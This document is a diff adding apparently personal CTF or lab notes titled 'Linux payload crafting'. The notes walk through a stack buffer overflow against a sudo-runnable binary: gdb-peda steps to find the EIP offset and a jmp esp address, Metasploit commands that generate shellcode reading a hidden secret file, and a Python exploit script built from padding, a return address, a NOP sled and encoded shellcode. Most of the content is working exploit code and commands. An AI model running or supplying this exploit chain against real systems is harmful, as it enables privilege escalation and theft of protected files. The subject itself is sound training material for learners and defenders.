@@ -1,0 +1,75 @@
+						LINUX PAYLOAD CRAFTING 
+
+______________________________________________________________________________________________________________________
+
+sudo -l to find path location of file 
+
+________________________________________________________________________
+
+Extract info from host:
+
+gdb-peda$ pattern create 200 #<copy pattern> for input when in run command
+gdb-peda$ file <filename>
+gdb-peda$ run # then here when prompt input the configured variable to get the output to then get theoffset
+gdb-peda$ pattern search <EIP variables ex: 'AAHA'> 
+gdb-peda$ info proc map <copy sr add from below heap and en addr from above stack>
+gdb-peda$ find /b <0xf7de2000 , 0xf7ffe000>, 0xff, 0xe4
+gdb-peda$ pattern search <variable> offset # this gets you the offset value you need
+
+_______________________________________________________________________
+
+Now we begin to build the payload and update the script
+CMDS to create Payloads:
+
+msf6$ 	use payload/linux/x86/exec
+msf6$	set CMD 'cat /.secret/.verysecret.pdb > output.txt'
+msf6$	generate -b "\x00" -f python
+
+
+#!/usr/bin/pyhton
+test = 'A' * 76 #overwrite registers up to the eip
+#'B' *4 this overwrites the instruction pointer
+eip = '\x59\x3b\xde\xf7' #
+'''
+0xf7de3b59
+0xf7f588ab
+0xf7f645fb
+0xf7f6460f
+0xf7f64aeb
+'''
+nop = '\x90' * 10 # the slsh shows its actual bytes whens ent to python
+shell = 'nada'
+
+# payload(linux/x86/exec) > generate -b "\0x00" -f python
+# linux/x86/exec - 84 bytes
+# https://metasploit.com/
+# Encoder: x86/shikata_ga_nai
+# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
+# PrependSetreuid=false, PrependSetuid=false, 
+# PrependSetresgid=false, PrependSetregid=false, 
+# PrependSetgid=false, PrependChrootBreak=false, 
+# AppendExit=false, CMD=touch /tmp/winner.txt, 
+# NullFreeVersion=false
+buf =  b""
+buf += b"\xbe\x18\x41\x31\x8f\xdb\xda\xd9\x74\x24\xf4\x58"
+buf += b"\x33\xc9\xb1\x0f\x83\xe8\xfc\x31\x70\x0f\x03\x70"
+buf += b"\x17\xa3\xc4\xe5\x2c\x7b\xbe\xa8\x54\x13\xed\x2f"
+buf += b"\x11\x04\x85\x80\x52\xa3\x56\xb7\xbb\x51\x3e\x29"
+buf += b"\x4a\x76\x92\x5d\x5a\x79\x13\x9e\x16\x16\x66\xfd"
+buf += b"\xbe\xc8\xa7\x75\x53\x79\x97\x02\xc2\x17\x89\x89"
+buf += b"\x66\xc6\x21\x2a\xf2\x16\x9d\x99\x73\xf7\xec\x9e"
+print(test+eip+nop+buf)
+
+________________________________________________________________________
+
+Extraction steps of file content:
+
+sudo </.hidden/filename.exe> <<<$(python <scriptname>)
+	    file paths		      Python Script
+
+cat <createdoutputfile.txt>
+
+
+
+
+					
